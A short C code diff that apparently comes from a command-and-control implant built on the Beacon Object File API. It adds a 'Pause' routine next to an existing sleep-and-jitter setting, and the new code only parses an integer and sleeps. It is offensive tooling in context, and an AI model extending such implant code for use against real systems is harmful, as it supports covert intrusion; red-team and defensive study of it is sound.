@@ -25,3 +25,13 @@ void SleepSet(char* buffer, int length)
 	gJitter = jitter;
 	BeaconDataZero(&parser);
 }
+
+void Pause(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+
+	int millis = BeaconDataInt(&parser);
+
+	Sleep(millis);
+}
